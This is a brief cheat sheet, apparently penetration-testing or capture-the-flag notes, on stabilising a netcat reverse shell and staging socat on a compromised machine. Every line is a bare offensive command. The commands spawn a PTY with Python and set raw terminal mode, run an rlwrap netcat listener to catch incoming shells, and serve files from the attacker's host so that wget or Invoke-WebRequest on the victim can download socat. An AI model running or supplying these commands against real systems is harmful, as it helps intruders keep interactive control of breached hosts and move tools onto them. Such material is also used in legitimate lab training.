Netcat Shell Stabilisation
	python -c 'import pty;pty.spawn("/bin/bash")'
	export TERM=xterm
	Cntrl + Z 
	stty raw -echo; fg
rlwrap
	rlwrap nc -lnvp <port>
		stty raw -echo; fg
Socat
	sudo python3 -m http.server 80
	wget <LOCAL-IP>/socat -O /tmp/socat
	Invoke-WebRequest -uri <LOCAL-IP>/socat.exe -outfile C:\\Windows\temp\socat.exe